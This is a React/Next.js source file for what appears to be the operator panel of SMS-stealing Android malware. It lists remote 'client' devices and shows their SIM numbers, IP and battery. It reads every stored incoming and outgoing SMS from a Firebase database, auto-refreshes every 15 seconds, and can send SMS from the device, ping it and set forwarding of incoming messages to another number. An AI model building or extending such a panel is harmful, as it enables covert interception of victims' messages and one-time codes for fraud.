'use client';

import { useEffect, useState, useCallback, useRef } from 'react';
import { ArrowLeft, Share2, RefreshCw, Send, Battery, Wifi, MessageSquare, Calendar, Globe, User, ChevronDown, ChevronUp, Search, Bell, BellOff, Zap, Smartphone } from 'lucide-react';
import { useAuth } from '@/components/auth-provider';
import { useParams, useRouter } from 'next/navigation';

interface SmsRecord {
  id: string;
  body: string;
  from?: string;
  to?: string;
  timestamp?: number;
  isSent: boolean;
}

interface DeviceInfo {
  displayName: string;
  phone: string;
  model: string;
  android: string;
  online: boolean;
  battery?: number;
  network: string;
  ip: string;
  simNumber?: string;
  simOperator?: string;
  joinedAt?: number;
  lastSeen?: number;
}

function toStr(v: unknown): string { return v != null ? String(v).trim() : ''; }
function toNum(v: unknown): number | undefined {
  if (typeof v === 'number') return v;
  if (typeof v === 'string' && v !== '') { const n = Number(v); if (!isNaN(n)) return n; }
  return undefined;
}
function firstVal(obj: Record<string, unknown>, keys: string[]): unknown {
  for (const k of keys) if (obj[k] != null && obj[k] !== '') return obj[k];
  return undefined;
}
function isOnlineRaw(r: Record<string, unknown>): boolean {
  for (const k of ['online','Online','isOnline','connected','Connected','active','Active','isActive','isConnected'])
    if (r[k] === true) return true;
  for (const k of ['online','status','Status','state','active','connected']) {
    const v = String(r[k] ?? '').toLowerCase();
    if (['true','1','yes','online','connected','active'].includes(v)) return true;
  }
  for (const k of ['lastSeen','LastSeen','updatedAt','lastActive','timestamp','time','lastOnline']) {
    const ts = r[k]; if (typeof ts === 'number' && ts > 0) {
      const ms = ts > 9999999999 ? ts : ts * 1000;
      if (Date.now() - ms < 5 * 60 * 1000) return true;
    }
  }
  return false;
}

function parseDevice(raw: Record<string, unknown>): DeviceInfo {
  const flat: Record<string, unknown> = { ...raw };
  const sims = raw['sims'] ?? raw['Sims'];
  let simNumber = '', simOperator = '';
  if (Array.isArray(sims) && sims.length > 0) {
    const s0 = sims[0] as Record<string, unknown>;
    simNumber = toStr(s0?.phoneNumber ?? s0?.number ?? s0?.phone ?? s0?.simNumber ?? s0?.mobNo ?? s0?.PhoneNumber ?? s0?.mobile ?? s0?.subscriberId ?? s0?.SubscriberId);
    simOperator = toStr(s0?.operator ?? s0?.Operator ?? s0?.provider ?? s0?.Provider ?? s0?.carrier ?? s0?.Carrier ?? s0?.network ?? s0?.Network ?? s0?.networkName ?? s0?.operatorName ?? s0?.displayName);
    if (simNumber && !flat['phoneNumber']) flat['phoneNumber'] = simNumber;
    if (simOperator && !flat['operator']) flat['operator'] = simOperator;
  }
  const nets = raw['networks'] ?? raw['Networks'];
  if (Array.isArray(nets) && nets.length > 0 && !flat['provider']) flat['provider'] = String(nets[0]);

  const brand = toStr(firstVal(flat, ['Brand','brand']));
  const model = toStr(firstVal(flat, ['modelName','model','Model','deviceModel','Device']));
  const fullModel = brand && model && !model.toLowerCase().startsWith(brand.toLowerCase())
    ? `${brand} ${model}` : (model || brand || '');
  const phone = toStr(firstVal(flat, ['mobNo','MobNo','phoneNumber','PhoneNumber','phone','Phone','mobile','Mobile','number','Number','simNumber','SimNumber','subscriberId','SubscriberId','mobileNumber','cellNumber']));
  const operator = toStr(firstVal(flat, ['provider','Provider','network','Network','operator','Operator','carrier']));

  return {
    displayName: fullModel,
    phone,
    model: fullModel,
    android: toStr(firstVal(flat, ['version','Version','androidVersion','android','Android','osVersion'])),
    online: isOnlineRaw(raw) || isOnlineRaw(flat),
    battery: toNum(firstVal(flat, ['batteryPercent','BatteryPercent','battery','Battery','batteryLevel','level','charge','percentage'])),
    network: operator,
    ip: toStr(firstVal(flat, ['ip','IP','ipAddress'])),
    simNumber: simNumber || phone,
    simOperator: simOperator || operator,
    joinedAt: toNum(firstVal(flat, ['joinedAt','createdAt','firstSeen','registeredAt','addedAt'])),
    lastSeen: toNum(firstVal(flat, ['lastSeen','LastSeen','updatedAt','timestamp','time','lastActive'])),
  };
}

function parseSms(id: string, raw: Record<string, unknown>): SmsRecord {
  const isSent = !!(raw['isSended'] || raw['isSent'] || raw['sent'] ||
    String(raw['type'] ?? '').toLowerCase() === 'sent' ||
    String(raw['direction'] ?? '').toLowerCase() === 'outgoing' ||
    raw['messageType'] === 'sent');
  return {
    id,
    body: toStr(firstVal(raw, ['body','Body','message','Message','text','Text','smsBody','content'])),
    from: toStr(firstVal(raw, ['from','From','sender','Sender','senderNumber'])) || undefined,
    to: toStr(firstVal(raw, ['to','To','recipient','Recipient','toNumber','number'])) || undefined,
    timestamp: toNum(firstVal(raw, ['timestamp','Timestamp','time','Time','date','Date','createdAt','receivedAt','sentAt'])),
    isSent,
  };
}

function fmtJoined(ts: number | undefined): string {
  if (!ts) return '—';
  const d = new Date(ts > 9999999999 ? ts : ts * 1000);
  return d.toLocaleDateString('en-IN', { day: '2-digit', month: '2-digit', year: 'numeric' }) + ' | ' +
    d.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
}

function fmtMsg(ts: number | undefined): string {
  if (!ts) return '';
  const d = new Date(ts > 9999999999 ? ts : ts * 1000);
  return d.toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: '2-digit' }).replace(/ /g, '-') + ' | ' +
    d.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
}

function loadStr(k: string): string { try { return localStorage.getItem(k) ?? ''; } catch { return ''; } }

async function adminRtdb(method: 'GET' | 'POST', path: string, data?: unknown) {
  const saRaw = loadStr('panel_service_account');
  const rtdbUrl = loadStr('panel_rtdb_url');
  if (!saRaw || !rtdbUrl) throw new Error('Not configured');
  const res = await fetch('/api/admin-rtdb', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ serviceAccount: JSON.parse(saRaw), rtdbUrl, path, method, data }),
    signal: AbortSignal.timeout(15000),
  });
  const json = await res.json() as { data?: unknown; error?: string };
  if (json.error) throw new Error(json.error);
  return json.data;
}

type TabType = 'overview' | 'actions';
type SmsFilter = 'all' | 'incoming' | 'outgoing';

export default function DeviceDetailPage() {
  const { id } = useParams() as { id: string };
  const router = useRouter();
  const { idToken } = useAuth();
  const [device, setDevice] = useState<DeviceInfo | null>(null);
  const [smsMessages, setSmsMessages] = useState<SmsRecord[]>([]);
  const [tab, setTab] = useState<TabType>('overview');
  const [smsFilter, setSmsFilter] = useState<SmsFilter>('all');
  const [smsSearch, setSmsSearch] = useState('');
  const [smsSendOpen, setSmsSendOpen] = useState(false);
  const [loadingDevice, setLoadingDevice] = useState(true);
  const [loadingSms, setLoadingSms] = useState(true);
  const [sendTo, setSendTo] = useState('');
  const [sendBody, setSendBody] = useState('');
  const [sendSlot, setSendSlot] = useState(0);
  const [sending, setSending] = useState(false);
  const [sendStatus, setSendStatus] = useState<{ ok: boolean; msg: string } | null>(null);
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [smsPage, setSmsPage] = useState(50);
  const autoRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const sendToSet = useRef(false);

  const fetchDevice = useCallback(async () => {
    try {
      const data = await adminRtdb('GET', `/clients/${id}`) as Record<string, unknown> | null;
      if (data) {
        const info = parseDevice(data);
        setDevice(info);
        if (info.phone && !sendToSet.current) { setSendTo(info.phone); sendToSet.current = true; }
      }
    } catch {
      try {
        const url = loadStr('panel_rtdb_url');
        if (url && idToken) {
          const res = await fetch(`${url.replace(/\/$/, '')}/clients/${id}.json?auth=${idToken}`);
          if (res.ok) {
            const data = await res.json() as Record<string, unknown>;
            if (data) {
              const info = parseDevice(data);
              setDevice(info);
              if (info.phone && !sendToSet.current) { setSendTo(info.phone); sendToSet.current = true; }
            }
          }
        }
      } catch { /**/ }
    } finally { setLoadingDevice(false); }
  }, [id, idToken]);

  const fetchSms = useCallback(async () => {
    setLoadingSms(true);
    try {
      const data = await adminRtdb('GET', `/messages/${id}`) as Record<string, unknown> | null;
      if (!data) { setSmsMessages([]); return; }
      const parsed = Object.entries(data)
        .filter(([, v]) => v && typeof v === 'object')
        .map(([k, v]) => parseSms(k, v as Record<string, unknown>))
        .filter(s => s.body)
        .sort((a, b) => (b.timestamp ?? 0) - (a.timestamp ?? 0));
      setSmsMessages(parsed);
    } catch { /**/ } finally { setLoadingSms(false); }
  }, [id]);

  useEffect(() => { fetchDevice(); fetchSms(); }, [fetchDevice, fetchSms]);

  useEffect(() => {
    if (autoRef.current) clearInterval(autoRef.current);
    if (autoRefresh) {
      autoRef.current = setInterval(() => { fetchDevice(); fetchSms(); }, 15_000);
    }
    return () => { if (autoRef.current) clearInterval(autoRef.current); };
  }, [autoRefresh, fetchDevice, fetchSms]);

  async function sendSms() {
    if (!sendTo.trim() || !sendBody.trim()) return;
    setSending(true); setSendStatus(null);
    try {
      // payload with all known field name variants (different app versions use different keys)
      const payload = {
        to: sendTo.trim(),
        number: sendTo.trim(),
        phoneNumber: sendTo.trim(),
        body: sendBody.trim(),
        message: sendBody.trim(),
        smsBody: sendBody.trim(),
        simSlot: sendSlot,
        simSlotIndex: sendSlot,
        sim: sendSlot,
        slot: sendSlot,
        channel: sendSlot,
        deviceId: id,
        targetDeviceId: id,
        id,
        timestamp: Date.now(),
        time: Date.now(),
        status: 'pending',
      };
      // try both paths — some apps listen on /forwardSms (push), others on /forwardSms/{deviceId} (set)
      await Promise.allSettled([
        adminRtdb('POST', '/forwardSms', payload),
        adminRtdb('POST', `/forwardSms/${id}`, payload),
      ]);
      setSendStatus({ ok: true, msg: 'SMS dispatched successfully!' });
      setSendBody('');
    } catch (e) {
      setSendStatus({ ok: false, msg: e instanceof Error ? e.message : 'Send failed' });
    } finally { setSending(false); }
  }

  const filteredSms = smsMessages
    .filter(s => smsFilter === 'all' ? true : smsFilter === 'incoming' ? !s.isSent : s.isSent)
    .filter(s => !smsSearch || s.body.toLowerCase().includes(smsSearch.toLowerCase()) ||
      (s.from ?? '').includes(smsSearch) || (s.to ?? '').includes(smsSearch));

  const batteryColor = !device?.battery ? 'text-slate-400' :
    device.battery > 50 ? 'text-emerald-400' : device.battery > 20 ? 'text-amber-400' : 'text-red-400';
  const batteryBarColor = !device?.battery ? 'bg-slate-600' :
    device.battery > 50 ? 'bg-emerald-400' : device.battery > 20 ? 'bg-amber-400' : 'bg-red-400';

  return (
    <div className="min-h-screen bg-slate-950">
      {/* Top Bar */}
      <div className="sticky top-0 z-20 bg-slate-900/95 backdrop-blur border-b border-slate-700/50">
        <div className="flex items-center justify-between px-4 py-3">
          <button onClick={() => router.back()} className="p-1.5 rounded-lg hover:bg-slate-700/50 transition-colors">
            <ArrowLeft className="w-5 h-5 text-slate-300" />
          </button>
          <div className="flex-1 mx-3">
            <div className="flex items-center gap-2">
              <span className="text-sm font-bold text-slate-100 font-mono tracking-wide">
                {loadingDevice ? '…' : (device?.phone || id.slice(0, 16))}
              </span>
              <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded border ${
                device?.online
                  ? 'text-emerald-400 border-emerald-500/50 bg-emerald-500/10'
                  : 'text-slate-400 border-slate-600/50 bg-slate-700/20'
              }`}>
                {device?.online ? 'ONLINE' : 'OFFLINE'}
              </span>
            </div>
            {device && (
              <p className="text-[11px] text-slate-400 mt-0.5">
                {device.model}{device.model && device.network ? ' · ' : ''}{device.network || ''}
              </p>
            )}
          </div>
          <div className="flex items-center gap-1">
            <button onClick={() => { fetchDevice(); fetchSms(); }} className="p-1.5 rounded-lg hover:bg-slate-700/50">
              <RefreshCw className="w-4 h-4 text-slate-400" />
            </button>
            <button className="p-1.5 rounded-lg hover:bg-slate-700/50">
              <Share2 className="w-4 h-4 text-slate-400" />
            </button>
          </div>
        </div>

        {/* Nav Tabs */}
        <div className="flex border-t border-slate-700/40">
          {(['overview', 'actions'] as TabType[]).map(t => (
            <button key={t} onClick={() => setTab(t)}
              className={`flex-1 py-2.5 text-xs font-bold tracking-widest uppercase transition-colors border-b-2 ${
                tab === t ? 'border-teal-400 text-teal-400' : 'border-transparent text-slate-400 hover:text-slate-300'
              }`}>
              {t}
            </button>
          ))}
        </div>
      </div>

      {tab === 'overview' && (
        <div>
          {/* Stat Cards */}
          <div className="grid grid-cols-3 gap-px bg-slate-800/50">
            {/* Battery */}
            <div className="bg-slate-900 p-4">
              <div className="flex items-center justify-between mb-2">
                <p className="text-[10px] font-bold text-slate-400 tracking-widest">BATTERY</p>
                <Battery className="w-3.5 h-3.5 text-slate-500" />
              </div>
              {loadingDevice ? <div className="h-7 w-16 bg-slate-700 rounded animate-pulse" /> : (
                <>
                  <p className={`text-2xl font-extrabold ${batteryColor}`}>
                    {device?.battery != null ? `${device.battery}%` : '—'}
                  </p>
                  {device?.battery != null && (
                    <div className="mt-2 h-1 w-full bg-slate-700 rounded-full overflow-hidden">
                      <div className={`h-full rounded-full ${batteryBarColor}`} style={{ width: `${device.battery}%` }} />
                    </div>
                  )}
                </>
              )}
            </div>

            {/* Messages */}
            <div className="bg-slate-900 p-4 border-x border-slate-800/50">
              <div className="flex items-center justify-between mb-2">
                <p className="text-[10px] font-bold text-slate-400 tracking-widest">MESSAGES</p>
                <MessageSquare className="w-3.5 h-3.5 text-slate-500" />
              </div>
              {loadingSms ? <div className="h-7 w-12 bg-slate-700 rounded animate-pulse" /> : (
                <>
                  <p className="text-2xl font-extrabold text-slate-100">{smsMessages.length}</p>
                  <p className="text-[10px] text-slate-500 mt-1">Total received</p>
                </>
              )}
            </div>

            {/* Network */}
            <div className="bg-slate-900 p-4">
              <div className="flex items-center justify-between mb-2">
                <p className="text-[10px] font-bold text-slate-400 tracking-widest">CONNECTION</p>
                <Wifi className="w-3.5 h-3.5 text-slate-500" />
              </div>
              {loadingDevice ? <div className="h-7 w-20 bg-slate-700 rounded animate-pulse" /> : (
                <>
                  <p className="text-sm font-bold text-slate-100 leading-tight">{device?.network || '—'}</p>
                  <p className="text-[10px] text-slate-500 mt-1">{device?.ip || 'No IP'}</p>
                </>
              )}
            </div>
          </div>

          {/* Detail Rows */}
          <div className="bg-slate-900 mt-px divide-y divide-slate-700/30">
            <div className="flex items-center justify-between px-4 py-3">
              <div className="flex items-center gap-3">
                <Calendar className="w-4 h-4 text-slate-500" />
                <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">JOINED</span>
              </div>
              <span className="text-sm text-slate-200">{fmtJoined(device?.joinedAt)}</span>
            </div>
            <div className="flex items-center justify-between px-4 py-3">
              <div className="flex items-center gap-3">
                <Wifi className="w-4 h-4 text-slate-500" />
                <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">CONNECTION</span>
              </div>
              <span className="text-sm text-slate-200">{device?.network || '—'}</span>
            </div>
            <div className="flex items-center justify-between px-4 py-3">
              <div className="flex items-center gap-3">
                <Smartphone className="w-4 h-4 text-slate-500" />
                <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">SIM</span>
              </div>
              <div className="text-right">
                <p className="text-sm text-slate-200">{device?.simOperator || device?.network || '—'}</p>
                {device?.simNumber && <p className="text-xs text-slate-400 font-mono">{device.simNumber}</p>}
              </div>
            </div>
            <div className="flex items-center justify-between px-4 py-3">
              <div className="flex items-center gap-3">
                <Globe className="w-4 h-4 text-slate-500" />
                <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">ANDROID</span>
              </div>
              <span className="text-sm text-slate-200">{device?.android ? `Android ${device.android}` : '—'}</span>
            </div>
          </div>

          {/* Send SMS */}
          <div className="bg-slate-900 mt-px">
            <button onClick={() => setSmsSendOpen(v => !v)}
              className="w-full flex items-center justify-between px-4 py-3.5 hover:bg-slate-800/40 transition-colors">
              <div className="flex items-center gap-3">
                <Send className="w-4 h-4 text-teal-400" />
                <div className="text-left">
                  <p className="text-sm font-semibold text-slate-100">Send SMS</p>
                  <p className="text-[11px] text-slate-400">Dispatch a message through this device</p>
                </div>
              </div>
              {smsSendOpen ? <ChevronUp className="w-4 h-4 text-slate-400" /> : <ChevronDown className="w-4 h-4 text-slate-400" />}
            </button>

            {smsSendOpen && (
              <div className="px-4 pb-4 space-y-3 border-t border-slate-700/40 pt-3">
                {sendStatus && (
                  <div className={`rounded-lg px-3 py-2 text-sm ${sendStatus.ok ? 'bg-emerald-950/50 border border-emerald-700/50 text-emerald-400' : 'bg-red-950/50 border border-red-700/50 text-red-400'}`}>
                    {sendStatus.msg}
                  </div>
                )}
                <div>
                  <label className="text-[10px] font-bold text-slate-400 tracking-widest uppercase block mb-1.5">RECIPIENT</label>
                  <input type="tel" value={sendTo} onChange={e => setSendTo(e.target.value)} placeholder="+91…"
                    className="w-full bg-slate-800 border border-slate-600/50 rounded-lg px-3 py-2.5 text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-teal-500 font-mono" />
                </div>
                <div>
                  <label className="text-[10px] font-bold text-slate-400 tracking-widest uppercase block mb-1.5">MESSAGE</label>
                  <textarea rows={3} value={sendBody} onChange={e => setSendBody(e.target.value)} placeholder="Type your message…"
                    className="w-full bg-slate-800 border border-slate-600/50 rounded-lg px-3 py-2.5 text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-teal-500 resize-none" />
                </div>
                <div>
                  <label className="text-[10px] font-bold text-slate-400 tracking-widest uppercase block mb-1.5">SEND VIA</label>
                  <div className="flex gap-2">
                    {[0, 1].map(slot => (
                      <button key={slot} onClick={() => setSendSlot(slot)}
                        className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-semibold border transition-all ${
                          sendSlot === slot ? 'bg-teal-500/20 border-teal-500/60 text-teal-300' : 'bg-slate-800 border-slate-600/50 text-slate-400'
                        }`}>
                        SIM {slot + 1}{slot === 0 && device?.simOperator ? ` · ${device.simOperator}` : ''}
                        {slot === 0 && device?.simNumber ? ` — ${device.simNumber}` : ''}
                      </button>
                    ))}
                  </div>
                </div>
                <button onClick={sendSms} disabled={sending || !sendTo.trim() || !sendBody.trim()}
                  className="w-full flex items-center justify-center gap-2 py-3 rounded-lg bg-teal-500 hover:bg-teal-400 text-slate-900 font-bold text-sm transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
                  {sending ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
                  {sending ? 'Dispatching…' : 'Dispatch'}
                </button>
              </div>
            )}
          </div>

          {/* Messages List */}
          <div className="bg-slate-900 mt-px">
            <div className="flex items-center justify-between px-4 py-3 border-b border-slate-700/40">
              <div className="flex items-center gap-2">
                <MessageSquare className="w-4 h-4 text-teal-400" />
                <p className="text-sm font-semibold text-slate-100">
                  Messages <span className="text-slate-400 font-normal text-xs">({Math.min(filteredSms.length, smsPage)} / {filteredSms.length})</span>
                </p>
                {loadingSms && <RefreshCw className="w-3 h-3 text-slate-500 animate-spin" />}
              </div>
              <div className="flex items-center gap-2">
                <button onClick={() => setAutoRefresh(v => !v)}
                  className={`flex items-center gap-1 text-[10px] font-bold transition-colors ${autoRefresh ? 'text-teal-400' : 'text-slate-500'}`}>
                  {autoRefresh ? <Bell className="w-3 h-3" /> : <BellOff className="w-3 h-3" />}
                  Auto-refresh {autoRefresh ? 'ON' : 'OFF'}
                </button>
                <button onClick={fetchSms} className="p-1 rounded hover:bg-slate-700/50">
                  <RefreshCw className="w-3.5 h-3.5 text-slate-400" />
                </button>
              </div>
            </div>

            {/* Filter + Search */}
            <div className="flex items-center border-b border-slate-700/40">
              {(['all', 'incoming', 'outgoing'] as SmsFilter[]).map(f => (
                <button key={f} onClick={() => setSmsFilter(f)}
                  className={`px-4 py-2 text-[11px] font-bold uppercase tracking-widest border-b-2 transition-colors ${
                    smsFilter === f ? 'border-teal-400 text-teal-400' : 'border-transparent text-slate-500 hover:text-slate-300'
                  }`}>
                  {f}
                </button>
              ))}
              <div className="flex-1 flex items-center gap-2 px-3">
                <Search className="w-3.5 h-3.5 text-slate-500 flex-shrink-0" />
                <input value={smsSearch} onChange={e => setSmsSearch(e.target.value)} placeholder="Search messages…"
                  className="bg-transparent text-xs text-slate-300 placeholder-slate-600 focus:outline-none w-full py-2" />
              </div>
            </div>

            {loadingSms ? (
              <div className="py-2 divide-y divide-slate-700/30">
                {Array.from({ length: 4 }).map((_, i) => (
                  <div key={i} className="px-4 py-3 space-y-2">
                    <div className="h-2.5 w-20 bg-slate-700 rounded animate-pulse" />
                    <div className="h-3.5 w-full bg-slate-800 rounded animate-pulse" />
                    <div className="h-3 w-1/2 bg-slate-800 rounded animate-pulse" />
                  </div>
                ))}
              </div>
            ) : filteredSms.length === 0 ? (
              <div className="py-12 text-center">
                <MessageSquare className="w-8 h-8 text-slate-700 mx-auto mb-2" />
                <p className="text-sm text-slate-500">No messages</p>
              </div>
            ) : (
              <div className="divide-y divide-slate-700/30">
                {filteredSms.slice(0, smsPage).map(sms => (
                  <div key={sms.id} className="px-4 py-3 hover:bg-slate-800/30 transition-colors">
                    <div className="flex items-start justify-between gap-2 mb-1.5">
                      <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded tracking-widest ${
                        sms.isSent ? 'bg-blue-500/20 text-blue-400' : 'bg-teal-500/20 text-teal-400'
                      }`}>
                        SMS MESSAGE {sms.isSent ? 'OUT' : 'IN'}
                      </span>
                      <span className="text-[10px] text-slate-500 whitespace-nowrap flex-shrink-0">{fmtMsg(sms.timestamp)}</span>
                    </div>
                    <p className="text-sm text-slate-200 leading-relaxed break-words">{sms.body}</p>
                    <p className="text-[11px] text-slate-500 mt-1.5 font-mono">
                      {sms.isSent ? `To: ${sms.to || '?'}` : `From: ${sms.from || '?'}`}
                    </p>
                  </div>
                ))}
                {filteredSms.length > smsPage && (
                  <button onClick={() => setSmsPage(p => p + 50)}
                    className="w-full py-3 text-xs text-teal-400 hover:text-teal-300 font-semibold">
                    Load more ({filteredSms.length - smsPage} remaining)
                  </button>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {tab === 'actions' && (
        <div className="bg-slate-900 mt-px divide-y divide-slate-700/30">
          {/* Ping */}
          <div className="flex items-center justify-between px-4 py-4">
            <div className="flex items-center gap-3">
              <Zap className="w-4 h-4 text-teal-400" />
              <div>
                <p className="text-sm font-semibold text-slate-100">Ping device</p>
                <p className="text-xs text-slate-400">Verify the device is alive — waits up to 10s for a pong reply.</p>
              </div>
            </div>
            <button onClick={async () => {
              try { await adminRtdb('POST', `/clients/${id}/ping`, { ts: Date.now(), type: 'ping' }); alert('Ping sent'); }
              catch (e) { alert(e instanceof Error ? e.message : 'Failed'); }
            }} className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-teal-500/20 border border-teal-500/40 text-teal-300 text-xs font-semibold hover:bg-teal-500/30 transition-colors">
              <Zap className="w-3.5 h-3.5" /> Ping
            </button>
          </div>

          {/* SMS Forward */}
          <div className="px-4 py-4 space-y-3">
            <div className="flex items-center gap-3 mb-1">
              <Send className="w-4 h-4 text-teal-400" />
              <div>
                <p className="text-sm font-semibold text-slate-100">SMS Forwarder</p>
                <p className="text-xs text-slate-400">Forward incoming SMS to another number</p>
              </div>
            </div>
            <div>
              <label className="text-[10px] font-bold text-slate-400 tracking-widest uppercase block mb-1.5">DESTINATION NUMBER</label>
              <input type="tel" placeholder="9XXXXXXXXX"
                className="w-full bg-slate-800 border border-slate-600/50 rounded-lg px-3 py-2.5 text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-teal-500 font-mono" />
            </div>
            <div>
              <label className="text-[10px] font-bold text-slate-400 tracking-widest uppercase block mb-1.5">SELECT SIM</label>
              <div className="flex gap-2">
                {[0, 1].map(slot => (
                  <button key={slot} className="flex items-center gap-2 px-3 py-2 rounded-lg bg-slate-800 border border-slate-600/50 text-xs text-slate-300">
                    SIM {slot + 1}{slot === 0 && device?.simOperator ? ` · ${device.simOperator}` : ''}
                    {slot === 0 && device?.simNumber ? <span className="text-slate-500 font-mono ml-1">{device.simNumber}</span> : null}
                  </button>
                ))}
              </div>
            </div>
            <button className="w-full flex items-center justify-center gap-2 py-2.5 rounded-lg bg-teal-500/20 border border-teal-500/40 text-teal-300 text-sm font-semibold">
              Save Forwarder Settings
            </button>
          </div>

          {/* Device details */}
          <div className="px-4 py-4">
            <div className="flex items-center gap-3 mb-3">
              <User className="w-4 h-4 text-teal-400" />
              <p className="text-sm font-semibold text-slate-100">Device Info</p>
            </div>
            <div className="space-y-2 text-xs font-mono">
              {[['Device ID', id], ['Model', device?.model || '—'], ['Android', device?.android || '—'], ['IP', device?.ip || '—']].map(([k, v]) => (
                <div key={k} className="flex justify-between gap-4 py-1.5 border-b border-slate-700/30">
                  <span className="text-slate-500">{k}</span>
                  <span className="text-slate-300 text-right break-all max-w-[60%]">{v}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
